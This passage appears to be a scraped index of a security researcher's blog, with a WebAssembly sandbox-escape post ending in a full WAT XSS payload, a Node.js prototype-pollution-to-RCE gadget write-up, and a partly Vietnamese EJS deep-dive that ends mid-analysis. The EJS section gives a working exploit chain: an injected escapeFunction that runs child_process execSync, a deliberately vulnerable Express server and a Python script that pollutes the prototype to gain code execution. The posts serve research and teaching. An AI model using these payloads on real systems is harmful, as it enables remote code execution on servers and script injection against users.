is to build an [{raw :\u0026hellip;}] . To get that I use the Object.values combine with Object.getOwnPropertyDesciptors to get an array with innerObject. Then merge our raw obj with innerObj we will finally have the things we need . String.raw not care about the other keys And finally we will have a string :)\nFrom string to Xss # So its to easy now , call the Function with our String as payload Get the returned value and trigger by using groupBy again :) Then bump to xss !!!! My final wat (its too dirty , sorry abt that ):\n(module (import \u0026#34;ns\u0026#34; \u0026#34;logger\u0026#34; (func $logger (param externref ))) (import \u0026#34;toString\u0026#34; \u0026#34;constructor\u0026#34; (func $function (param externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;prototype\u0026#34; (global $oops externref)) (import \u0026#34;constructor\u0026#34; \u0026#34;values\u0026#34; (func $values (param externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;getOwnPropertyNames\u0026#34; (func $getOwnProp (param externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;getPrototypeOf\u0026#34; (func $getProto (param externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;getOwnPropertyDescriptors\u0026#34; (func $getOwnDis (param externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;getOwnPropertyDescriptor\u0026#34; (func $getOneOwnDis (param externref externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;keys\u0026#34; (func $getKeys (param externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;assign\u0026#34; (func $assign (param externref) (param externref)(result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;groupBy\u0026#34; (func $groupBy_i (param externref funcref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;groupBy\u0026#34; (func $groupByFunc (param externref externref) (result externref))) (import \u0026#34;constructor\u0026#34; \u0026#34;groupBy\u0026#34; (func $groupByI32Func (param i32 funcref) (result externref))) ;; define a table to hold function references (table 3 funcref) ;; init table with your callback (elem (i32.const 0) $save_first_element $genChar $genRawChar) (global $g_n (mut i32) (i32.const 0)) (global $g_nth_element (mut externref) (ref.null extern)) (global $stringProto (mut externref) (ref.null extern)) (global $s_fromCharCode (mut externref) (ref.null extern)) (global $s_raw (mut externref) (ref.null extern)) (global $f_fromCharCode (mut externref) (ref.null extern)) (global $f_raw (mut externref) (ref.null extern)) (global $charToGen (mut i32) (i32.const 0)) (global $resultString (mut externref) (ref.null extern)) (global $prevObj (mut externref) (ref.null extern)) (global $raw_obj (mut externref) (ref.null extern)) (global $arrWithObj (mut externref) (ref.null extern)) (global $temp (mut externref) (ref.null extern)) (global $finalString (mut externref) (ref.null extern)) (global $executeCode (mut externref) (ref.null extern)) (func $main global.get $oops call $values call $getOwnProp i32.const 0 call $array_get_nth_element ;; get own propp call $getProto call $getOwnDis call $values i32.const 1 call $array_get_nth_element ;; get own propp call $values i32.const 0 call $array_get_nth_element ;; get own propp (global.set $stringProto) (global.get $stringProto) ;; Object.keys(Object.getOwnPropertyDescriptors(String)) ;; Get func fromCharfcode call $getOwnDis call $getKeys i32.const 3 call $array_get_nth_element (global.set $s_fromCharCode) (global.get $stringProto) (global.get $s_fromCharCode) call $getOneOwnDis call $values i32.const 0 call $array_get_nth_element (global.set $f_fromCharCode) ;; Get func string .raw (global.get $stringProto) call $getOwnDis call $getKeys i32.const 5 call $array_get_nth_element (global.set $s_raw) (global.get $stringProto) (global.get $s_raw) call $getOneOwnDis call $values i32.const 0 call $array_get_nth_element (global.set $f_raw) ;;; MAP key =\u0026gt; [\u0026#39;CHAR\u0026#39;] i32.const 1 i32.const 97 call $keyMapCharArray (global.set $prevObj) i32.const 2 i32.const 61 call $addKeyMapCharArray i32.const 3 i32.const 49 call $addKeyMapCharArray i32.const 4 i32.const 59 call $addKeyMapCharArray i32.const 5 i32.const 32 call $addKeyMapCharArray i32.const 6 i32.const 97 call $addKeyMapCharArray i32.const 7 i32.const 108 call $addKeyMapCharArray i32.const 8 i32.const 101 call $addKeyMapCharArray i32.const 9 i32.const 114 call $addKeyMapCharArray i32.const 10 i32.const 116 call $addKeyMapCharArray i32.const 11 i32.const 40 call $addKeyMapCharArray i32.const 12 i32.const 41 call $addKeyMapCharArray ;; build {raw:[[\u0026#34;H\u0026#34;,\u0026#34;A\u0026#34;]]} (global.get $prevObj) call $values (ref.func $genRawChar) call $groupBy_i (global.set $raw_obj) ;; Build array to use ObjectGroup By tricks (global.get $raw_obj) call $getOwnDis call $values (global.set $arrWithObj) (global.get $arrWithObj) i32.const 0 call $array_get_nth_element (global.get $raw_obj) call $assign (global.set $temp) (global.get $arrWithObj) (global.get $f_raw) call $groupByFunc call $getKeys i32.const 0 call $array_get_nth_element (global.set $finalString) ;; NOW WE FUCK THE GAMES CALL THE FUNCTIONS(STRING PAYLOAD) WITH OBJ GROUP BY (global.get $finalString) ;; call Function(\u0026#34;faaeklf\u0026#34;) to get function returned call $function (global.set $executeCode) ;; Call the return function with gorup by (global.get $arrWithObj) (global.get $executeCode) call $groupByFunc call $logger ;; need to do some callback here ) (func $genRawChar (param $val externref) (param $n i32) (result externref) (global.get $s_raw) ) (func $addKeyMapCharArray (param $key i32) (param $char i32) local.get $key local.get $char call $keyMapCharArray (global.get $prevObj) call $assign (global.set $prevObj) ) (func $keyMapCharArray (param $key i32) (param $char i32)(result externref) (local.get $char) call $createChar (local.get $key) (global.set $charToGen) (ref.func $genChar) call $groupBy_i ) (func $createChar (param $ord i32)(result externref) (local.get $ord) (global.set $charToGen) (global.get $s_fromCharCode) call $getKeys (ref.func $genChar) call $groupBy_i call $getKeys (global.get $f_fromCharCode) ;; it works =))))))) call $groupByFunc call $getKeys i32.const 0 call $array_get_nth_element i32.const 0 call $array_get_nth_element ) (func $save_first_element (param $val externref) (param $n i32) (if (i32.eq (local.get $n) (global.get $g_n)) (then local.get $val global.set $g_nth_element ) ) ) (func $array_get_nth_element (param $arr externref) (param $n i32) (result externref) (local.get $n) (global.set $g_n) ;; get funcref from table instead of raw ref.func (local.get $arr) (ref.func $save_first_element) ;; ‚úÖ now valid because $save_first_element is in elem call $groupBy_i drop (global.get $g_nth_element) ) (func $genChar (param $arr externref)(param $ord i32) (result i32) (global.get $charToGen) ) (start $main) ) We get it !! Or you can read of the author payload here https://archives.phrack.org/dl/72/10/popping-poc.wat , but I recommend coding it because its fun.\n","date":"28 August 2025","externalUrl":null,"permalink":"/posts/wasm/","section":"Posts","summary":"Resource : https://media.ccc.de/v/why2025-226-escaping-a-misleading-sandbox-breaking-the-webassembly-javascript-barrier https://webassembly.github.io/spec/core/intro/introduction.html https://developer.mozilla.org/en-US/docs/WebAssembly https://phrack.org/issues/72/10_md#article\nWhat is wasm ? # In short, its used for optimizing some actions for the browser. It doesn\u0026rsquo;t have any access to Dom or Javascript Web Api . The only way it can interact with that is through an import object . But we should learn some basic first . Understanding WebAssembly text format # There\u0026rsquo;s 2 type of file , wat and wasm. But we should code in wat because it is readable form.","title":"Some notes on Web Assembly","type":"posts"},{"content":" Prototype pollution to RCE gadget in node js newest with module imports # A Prototype pollution gadget in newest node js (v24.6.0): Example : Package.json :\n{ \u0026#34;name\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;commonjs\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; } } Note : this just works if the type is \u0026ldquo;commonjs\u0026rdquo; or \u0026ldquo;module\u0026rdquo; . And the javascript stored in \u0026ldquo;a.js\u0026rdquo; wont be executed . Let\u0026rsquo;s debug # To understand the flow of the import module i have a simple crash here : Object.prototype.source = \u0026#34;console.log(123\u0026#34; import(\u0026#34;./a.js\u0026#34;) So put those breakpoint on the debugger and see how it works . You can use node --inspect-brk index.js First when i read the import(\u0026lsquo;a.js\u0026rsquo;) it will do a bunch of stuffs to convert that in to form \u0026ldquo;file:///\u0026rdquo; then it will apply a loadContext It will do some stuffs here to check what source should be : The format variables basically is the \u0026ldquo;type\u0026rdquo; in the package.json. So if the format is not set , it will fallback to set the format into \u0026ldquo;commonjs\u0026rdquo; and the source into null (we dont want this happen right ?). Then it will check if source is null or not to fetch to \u0026ldquo;a.js\u0026rdquo; file to read the source and put it back . The vulnearbilites here is that if we have prototype pollution, the source here get controlled. And the \u0026ldquo;??\u0026rdquo; will use our source instead . Finally that source will go through so much stuffs but not get overwrited anywhere more . Final source will be put into loadCJS Then get compiled with compileFunctionForCJSLoader (you can see that source is our payload but not the a.js)\nThe compileFunctoinForCJSLoader will compile our source as a string https://github.com/nodejs/node/blob/main/src/node_contextify.cc\nConclusion # This gadget is too hard to find out and i dont really understand how the Sekai Guys can find it too good. Maybe use some fuzzer but btw now i understand it a little bit . ","date":"19 August 2025","externalUrl":null,"permalink":"/posts/prototypegadget/","section":"Posts","summary":"Prototype pollution to RCE gadget in node js newest with module imports # A Prototype pollution gadget in newest node js (v24.6.0): Example : Package.json :\n{ \u0026#34;name\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;commonjs\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; } } Note : this just works if the type is \u0026ldquo;commonjs\u0026rdquo; or \u0026ldquo;module\u0026rdquo; . And the javascript stored in \u0026ldquo;a.","title":"New PP2RCE Gadget","type":"posts"},{"content":" DEEP DOWN TO EJS # Example usage : # ƒê∆°n gi·∫£n nh∆∞ sau thui : const ejs = require(\u0026#34;ejs\u0026#34;) const template = \u0026#39;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;; ejs.clearCache(); const data = { name: \u0026#34;12113awefeaw\u0026#34; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works # Ta c√πng ƒë·ªçc qua v·ªÅ h√†m render :\nexports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.createNullProtoObjWherePossible(); // No options object -- if there are optiony names // in the data, copy them to options if (arguments.length == 2) { utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA); } return handleCache(opts, template)(data); }; H√†m nh·∫≠n v√†o data v√† options . N·∫øu kh√¥ng c√≥ options th√¨ ki·ªÉu tra data xem c√≥ key n√†o c√≥ th·ªÉ cho v√†o OPTIONS hay kh√¥ng theo danh s√°ch tr√™n : var _OPTS_PASSABLE_WITH_DATA = [\u0026#39;delimiter\u0026#39;, \u0026#39;scope\u0026#39;, \u0026#39;context\u0026#39;, \u0026#39;debug\u0026#39;, \u0026#39;compileDebug\u0026#39;, \u0026#39;client\u0026#39;, \u0026#39;_with\u0026#39;, \u0026#39;rmWhitespace\u0026#39;, \u0026#39;strict\u0026#39;, \u0026#39;filename\u0026#39;, \u0026#39;async\u0026#39;]; Sau ƒë√≥ g·ªçi h√†m handleCache nh·∫≠n v·ªÅ m·ªôt function v√† cho data l√†m ƒë·ªëi s·ªë. V·∫≠y ta s·∫Ω ph·∫£i t√¨m hi·ªÉu h√†m handleCache s·∫Ω tr·∫£ v·ªÅ function g√¨ . handleCache :\nfunction handleCache(options, template) { var func; var filename = options.filename; var hasTemplate = arguments.length \u0026gt; 1; if (options.cache) { if (!filename) { throw new Error(\u0026#39;cache option requires a filename\u0026#39;); } func = exports.cache.get(filename); if (func) { return func; } if (!hasTemplate) { template = fileLoader(filename).toString().replace(_BOM, \u0026#39;\u0026#39;); } } else if (!hasTemplate) { // istanbul ignore if: should not happen at all if (!filename) { throw new Error(\u0026#39;Internal EJS error: no file name or template \u0026#39; + \u0026#39;provided\u0026#39;); } template = fileLoader(filename).toString().replace(_BOM, \u0026#39;\u0026#39;); } func = exports.compile(template, options); if (options.cache) { exports.cache.set(filename, func); } return func; } Tr∆∞·ªõc h·∫øt n√≥ s·∫Ω ki·ªÉm tra options cache xem c√≥ hay kh√¥ng sau ƒë√≥ s·∫Ω d√πng filename ƒë√≥ ƒë∆∞a v√†o h√†m cache.get(filename) ƒë·ªÉ nh·∫≠n v·ªÅ m·ªôt function th·ª© m√† ta c√≥ th·ªÉ ƒë∆∞a data v√†o ƒë·ªÉ nh·∫≠n ƒë∆∞·ª£c template cu·ªëi c√πng. Tr∆∞·ªùng h·ª£p kh√¥ng c√≥ cache th√¨ s·∫Ω d√πng h√†m compile v·ªõi template v√† options ƒë∆∞·ª£c truy·ªÅn v√†o. compile function :\nexports.compile = function compile(template, opts) { var templ; // v1 compat // \u0026#39;scope\u0026#39; is \u0026#39;context\u0026#39; // FIXME: Remove this in a future version if (opts \u0026amp;\u0026amp; opts.scope) { if (!scopeOptionWarned) { console.warn(\u0026#39;`scope` option is deprecated and will be removed in EJS 3\u0026#39;); scopeOptionWarned = true; } if (!opts.context) { opts.context = opts.scope; } delete opts.scope; } templ = new Template(template, opts); return templ.compile(); }; T·∫°o m·ªôt Object template v√† tr·∫£ v·ªÅ k·∫øt qu·∫£ sau khi g·ªçi h√†m templ.compile() Class Template kh√° l·ªõn n√™n m√¨nh s·∫Ω t·∫≠p trung v√†o h√†m compile c·ªßa n√≥ . H√†m compile n√†y l√† core function ƒë·ªÉ t·∫°o n√™n m·ªôt function s·∫Ω nh·∫≠n data v√† tr·∫£ v·ªÅ template. Tr∆∞·ªõc khi ƒë·ªçc c√°c giai ƒëo·∫°n n√≥ t·∫°o ra h√†m th√¨ ta c√≥ th·ªÉ ƒë∆°n gi·∫£n l√† log h√†m ƒë√≥ ra : function anonymous(data) { var include = function (path, includeData) { var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data); if (includeData) { d = utils.shallowCopy(d, includeData); } return includeFile(path, opts)(d); }; return fn.apply(opts.context, [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]); } Copy data c√°c ki·ªÉu xong s·∫Ω d√πng h√†m fn.apply v·∫≠y ta c·∫ßn bi·∫øt fn ·ªü ƒë√¢y l√† h√†m g√¨ . ƒê·ªçc source ta c√≥ th·∫ª th·∫•y ƒëo·∫°n sau : var returnedFn = opts.client ? fn : function anonymous(data) { var include = function (path, includeData) { var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data); if (includeData) { d = utils.shallowCopy(d, includeData); } return includeFile(path, opts)(d); }; console.log(fn.toString()) return fn.apply(opts.context, [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]); }; V·ªõi options.client =0 th√¨ ta s·∫Ω nh·∫≠n ƒë∆∞·ª£c h√†m tr√™n v√† fn ·ªü ƒë√¢y sau khi log ra th√¨ ta c√≥ : function anonymous(locals, escapeFn, include, rethrow ) { var __line = 1 , __lines = \u0026#34;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026#34; , __filename = undefined; try { var __output = \u0026#34;\u0026#34;; function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s } with (locals || {}) { ; __append(\u0026#34;\u0026lt;h1\u0026gt;Hello \u0026#34;) ; __append(escapeFn( name )) ; __append(\u0026#34;\u0026lt;/h1\u0026gt;\u0026#34;) } return __output; } catch (e) { rethrow(e, __lines, __filename, __line, escapeFn); } } ƒê·∫øn ƒë√¢y ta ho√†n to√†n c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c logic m√† name ƒë∆∞·ª£c ƒë∆∞a v√†o template. Kh√° ph·ª©c t·∫°p ·ªü ƒë√¢y nh∆∞ng ta s·∫Ω ti·∫øp t·ª•c ƒë·ªçc v√†o h√†m n√†y. ƒê√¢y l√† source generate ƒë∆∞·ª£c ƒë·ªëng function tr√™n b·∫±ng c√°ch gh√©p nhi·ªÅu chu·ªói v·ªõi nhau if (!this.source) { this.generateSource(); prepended += \u0026#39; var __output = \u0026#34;\u0026#34;;\\n\u0026#39; + \u0026#39; function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s }\\n\u0026#39;; if (opts.outputFunctionName) { if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) { throw new Error(\u0026#39;outputFunctionName is not a valid JS identifier.\u0026#39;); } prepended += \u0026#39; var \u0026#39; + opts.outputFunctionName + \u0026#39; = __append;\u0026#39; + \u0026#39;\\n\u0026#39;; } if (opts.localsName \u0026amp;\u0026amp; !_JS_IDENTIFIER.test(opts.localsName)) { throw new Error(\u0026#39;localsName is not a valid JS identifier.\u0026#39;); } if (opts.destructuredLocals \u0026amp;\u0026amp; opts.destructuredLocals.length) { var destructuring = \u0026#39; var __locals = (\u0026#39; + opts.localsName + \u0026#39; || {}),\\n\u0026#39;; for (var i = 0; i \u0026lt; opts.destructuredLocals.length; i++) { var name = opts.destructuredLocals[i]; if (!_JS_IDENTIFIER.test(name)) { throw new Error(\u0026#39;destructuredLocals[\u0026#39; + i + \u0026#39;] is not a valid JS identifier.\u0026#39;); } if (i \u0026gt; 0) { destructuring += \u0026#39;,\\n \u0026#39;; } destructuring += name + \u0026#39; = __locals.\u0026#39; + name; } prepended += destructuring + \u0026#39;;\\n\u0026#39;; } if (opts._with !== false) { prepended += \u0026#39; with (\u0026#39; + opts.localsName + \u0026#39; || {}) {\u0026#39; + \u0026#39;\\n\u0026#39;; appended += \u0026#39; }\u0026#39; + \u0026#39;\\n\u0026#39;; } appended += \u0026#39; return __output;\u0026#39; + \u0026#39;\\n\u0026#39;; this.source = prepended + this.source + appended; } if (opts.compileDebug) { src = \u0026#39;var __line = 1\u0026#39; + \u0026#39;\\n\u0026#39; + \u0026#39; , __lines = \u0026#39; + JSON.stringify(this.templateText) + \u0026#39;\\n\u0026#39; + \u0026#39; , __filename = \u0026#39; + sanitizedFilename + \u0026#39;;\u0026#39; + \u0026#39;\\n\u0026#39; + \u0026#39;try {\u0026#39; + \u0026#39;\\n\u0026#39; + this.source + \u0026#39;} catch (e) {\u0026#39; + \u0026#39;\\n\u0026#39; + \u0026#39; rethrow(e, __lines, __filename, __line, escapeFn);\u0026#39; + \u0026#39;\\n\u0026#39; + \u0026#39;}\u0026#39; + \u0026#39;\\n\u0026#39;; } else { src = this.source; } if (opts.client) { src = \u0026#39;escapeFn = escapeFn || \u0026#39; + escapeFn.toString() + \u0026#39;;\u0026#39; + \u0026#39;\\n\u0026#39; + src; if (opts.compileDebug) { src = \u0026#39;rethrow = rethrow || \u0026#39; + rethrow.toString() + \u0026#39;;\u0026#39; + \u0026#39;\\n\u0026#39; + src; } } if (opts.strict) { src = \u0026#39;\u0026#34;use strict\u0026#34;;\\n\u0026#39; + src; } if (opts.debug) { console.log(src); } if (opts.compileDebug \u0026amp;\u0026amp; opts.filename) { src = src + \u0026#39;\\n\u0026#39; + \u0026#39;//# sourceURL=\u0026#39; + sanitizedFilename + \u0026#39;\\n\u0026#39;; } ƒê·∫øn ƒë√¢y ta ƒë√£ bi·∫øt r·∫±ng h√†m sau s·∫Ω ƒë∆∞·ª£c execute v√† h√†m ƒë∆∞·ª£c t·∫°o b·ªüi c√°c string gh√©p l·∫°i ? V·∫≠y s·∫Ω th·∫ø n√†o n·∫øu ta c√≥ th·∫ª input t√πy √Ω v√†o h√†m n√†y qua options c·ªßa ejs? T·ª´ ƒë√≥ l·∫•y RCE ? Ta s·∫Ω ƒëi t√¨m m·ªôt v√†i ƒëi·ªÉm n√†o ƒë√≥ c√≥ th·ªÉ cho ta input v√†o . Nh√¨n s∆° ta c√≥ th·ªÉ th·∫•y if (opts.outputFunctionName) { if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) { throw new Error(\u0026#39;outputFunctionName is not a valid JS identifier.\u0026#39;); } prepended += \u0026#39; var \u0026#39; + opts.outputFunctionName + \u0026#39; = __append;\u0026#39; + \u0026#39;\\n\u0026#39;; } Nh∆∞ng v√¨ c√≥ regrex kh√° cƒÉng n√™n c≈©ng kh√¥ng kh·∫£ thi l·∫Øm. Ri√™ng ch·ªâ c√≥ ƒëo·∫°n n√†y :\nif (opts.client) { src = \u0026#39;escapeFn = escapeFn || \u0026#39; + escapeFn.toString() + \u0026#39;;\u0026#39; + \u0026#39;\\n\u0026#39; + src; if (opts.compileDebug) { src = \u0026#39;rethrow = rethrow || \u0026#39; + rethrow.toString() + \u0026#39;;\u0026#39; + \u0026#39;\\n\u0026#39; + src; } } Well c·∫£ 2 bi·∫øn client v√† escapeFn ƒë·ªÅu ƒë∆∞·ª£c l·∫•y t·ª´ options object v√†o ? S·∫Ω ra sao n·∫øu ta split javascript code v·ªõi \u0026ldquo;;\u0026rdquo; v√† ch√®n rce code v√†o ?\nconst ejs = require(\u0026#34;ejs\u0026#34;) const template = \u0026#39;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;; escapeFunction = \u0026#34;JSON.stringify; console.log(1337);let cp = process.mainModule.require(\u0026#39;child_process\u0026#39;);console.log(cp.execSync(\u0026#39;id\u0026#39;).toString());\u0026#34; const data = { name: \u0026#34;12113awefeaw\u0026#34; } const compiled = ejs.render(template, data, { client: 1, escapeFunction: escapeFunction }); // not works console.log(compiled.toString()) Khi n√†y function sau s·∫Ω ƒë∆∞·ª£c generate ra :\nfunction anonymous(locals, escapeFn, include, rethrow ) { rethrow = rethrow || function rethrow(err, str, flnm, lineno, esc) { var lines = str.split(\u0026#39;\\n\u0026#39;); var start = Math.max(lineno - 3, 0); var end = Math.min(lines.length, lineno + 3); var filename = esc(flnm); // Error context var context = lines.slice(start, end).map(function (line, i) { var curr = i + start + 1; return (curr == lineno ? \u0026#39; \u0026gt;\u0026gt; \u0026#39; : \u0026#39; \u0026#39;) + curr + \u0026#39;| \u0026#39; + line; }).join(\u0026#39;\\n\u0026#39;); // Alter exception message err.path = filename; err.message = (filename || \u0026#39;ejs\u0026#39;) + \u0026#39;:\u0026#39; + lineno + \u0026#39;\\n\u0026#39; + context + \u0026#39;\\n\\n\u0026#39; + err.message; throw err; }; /*OUR OPTIONS GOES IN HERE */ escapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require(\u0026#39;child_process\u0026#39;);console.log(cp.execSync(\u0026#39;id\u0026#39;).toString());; var __line = 1 , __lines = \u0026#34;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026#34; , __filename = undefined; try { var __output = \u0026#34;\u0026#34;; function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s } with (locals || {}) { ; __append(\u0026#34;\u0026lt;h1\u0026gt;Hello \u0026#34;) ; __append(escapeFn( name )) ; __append(\u0026#34;\u0026lt;/h1\u0026gt;\u0026#34;) } return __output; } catch (e) { rethrow(e, __lines, __filename, __line, escapeFn); } } V√† ta ƒë√£ c√≥ th·ªÉ ch·∫°y b·∫•t k√¨ js command n√†o !!!\nescapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require(\u0026#39;child_process\u0026#39;);console.log(cp.execSync(\u0026#39;id\u0026#39;).toString());; Prototype pollution to RCE . # Nh∆∞ng trong th·ª±c t·∫ø ta s·∫Ω kh√¥ng ki·ªÉm so√°t ƒë∆∞·ª£c options ƒë∆∞·ª£c ch√®n v√†o . V·∫≠y s·∫Ω ra sao n·∫øu ta c√≥ m·ªôt prototype pollution ·ªü ph√≠a server ? Test v·ªõi ƒëo·∫°n code sau : const ejs = require(\u0026#34;ejs\u0026#34;) const template = \u0026#39;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;; ejs.clearCache(); escapeFunction = \u0026#34;JSON.stringify; console.log(1337);let cp = process.mainModule.require(\u0026#39;child_process\u0026#39;);console.log(cp.execSync(\u0026#39;id\u0026#39;).toString());\u0026#34; Object.prototype.client = true Object.prototype.escapeFunction = escapeFunction const data = { name: \u0026#34;12113awefeaw\u0026#34; } const compiled = ejs.render(template, data); // not works console.log(compiled.toString()) Hmmmm , ta th·∫•y kh√¥ng c√≥ g√¨ x·∫£y ra c·∫£ v√¨ n·∫øu ƒë·ªÉ √Ω t·ª´ ƒë·∫ßu ƒëo·∫°n code ƒë√£ c√≥ m·ªôt ph·∫ßn check r·∫•t r√µ :\nexports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.createNullProtoObjWherePossible(); } ƒêi·ªÅu n√†y ƒë√£ block vi·ªác protoytpe pollution nh∆∞ng c√≥ m·ªôt v·∫•n ƒë·ªÅ l√† nhi·ªÅu project ·ªü ngo√†i kia s·∫Ω kh√¥ng bao gi·ªù ƒë·ªÉ tr·ªëng options field v√† ƒë∆°n gi·∫£n s·∫Ω truy·ªÅn v√†o ƒë√≥ m·ªôt empty object ~ ~!! ch√≠nh ƒëi·ªÅu n√†y l√† root cause cho vi·ªác bypass n√†y , ƒë·ªÉ simluate ta ƒë∆°n gi·∫£n ch·ªâ c·∫ßn truy·ªÅn {} v√†o l√† ƒëc .\nconst ejs = require(\u0026#34;ejs\u0026#34;) const template = \u0026#39;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;; ejs.clearCache(); escapeFunction = \u0026#34;JSON.stringify; console.log(1337);let cp = process.mainModule.require(\u0026#39;child_process\u0026#39;);console.log(cp.execSync(\u0026#39;id\u0026#39;).toString());\u0026#34; Object.prototype.client = true Object.prototype.escapeFunction = escapeFunction const data = { name: \u0026#34;12113awefeaw\u0026#34; } const compiled = ejs.render(template, data, {}); // works now with polluted {} console.log(compiled.toString()) T√®n ten , ƒëi·ªÅu n√†y ho·∫°t ƒë·ªông v√¨ h√†m render s·∫Ω ∆∞u ti√™n nh·∫≠n object t·ª´ ngo√†i v√†o. Express js # ƒê·ªÉ ki·ªÉm ch·ª©ng vi·ªác truy·ªÅn object tr·ªëng v√†o options ta c√≥ th·ªÉ xem s∆° qua source c·ªßa express js ta s·∫Ω th·∫•y ƒëo·∫°n sau : V√¨ lu√¥n c√≥ options object n√™n Express default c≈©ng c√≥ th·ªÉ b·ªã l·ªói n√†y . POC : # Server.js :\nconst express = require(\u0026#39;express\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const app = express(); app.use(bodyParser.json()); // Set EJS as the template engine app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); // Set the views directory app.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); app.post(\u0026#34;/pollute_me\u0026#34;, (req, res) =\u0026gt; { // Prototype pollution vulnerability here Object.assign(Object.prototype, req.body); console.log({}.client) res.send(\u0026#39;Updated!\u0026#39;); }) // Define a simple route app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;index\u0026#39;, { title: \u0026#39;Hello EJS\u0026#39;, message: \u0026#39;Welcome to EJS Template!\u0026#39; }); }); // Start the server const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); ex.py :\nimport requests url = \u0026#34;http://localhost:3000\u0026#34; escapeFunction = \u0026#34;JSON.stringify; console.log(1337);let cp = process.mainModule.require(\u0026#39;child_process\u0026#39;);console.log(cp.execSync(\u0026#39;id\u0026#39;).toString());\u0026#34; data = { \u0026#34;client\u0026#34; : \u0026#39;123\u0026#39; , \u0026#34;escapeFunction\u0026#34; : escapeFunction } res = requests.post(url+\u0026#39;/pollute_me\u0026#39; ,json=data) print(res.text) requests.get(url) Express views use a default config when calling templating function, which make it vulnerable by default!\nAnother gadget : # S·∫Ω ra sao n·∫øu ta kh√¥ng c√≥ prototype pollution nh∆∞ng c√≥ th·ªÉ handle ƒë∆∞·ª£c bi·∫øn data ? Khi express g·ªçi t·ªõi render b·∫£n ch·∫•t n√≥ s·∫Ω g·ªçi t·ªõi export.__express // default engine export var fn = require(mod).__express Ejs :\n/** * Express.js support. * * This is an alias for {@link module:ejs.renderFile}, in order to support * Express.js out-of-the-box. * * @func */ exports.__express = exports.renderFile; V·∫≠y b·∫£n ch·∫•t c·ªßa express s·∫Ω g·ªçi t·ªõi h√†m renderFile :\nexports.renderFile = function () { var args = Array.prototype.slice.call(arguments); var filename = args.shift(); var cb; var opts = { filename: filename }; var data; var viewOpts; // Do we have a callback? if (typeof arguments[arguments.length - 1] == \u0026#39;function\u0026#39;) { cb = args.pop(); } // Do we have data/opts? if (args.length) { // Should always have data obj data = args.shift(); // Normal passed opts (data obj + opts obj) if (args.length) { // Use shallowCopy so we don\u0026#39;t pollute passed in opts obj with new vals utils.shallowCopy(opts, args.pop()); } // Special casing for Express (settings + opts-in-data) else { // Express 3 and 4 if (data.settings) { // Pull a few things from known locations if (data.settings.views) { opts.views = data.settings.views; } if (data.settings[\u0026#39;view cache\u0026#39;]) { opts.cache = true; } // Undocumented after Express 2, but still usable, esp. for // items that are unsafe to be passed along with data, like `root` viewOpts = data.settings[\u0026#39;view options\u0026#39;]; if (viewOpts) { utils.shallowCopy(opts, viewOpts); } } // Express 2 and 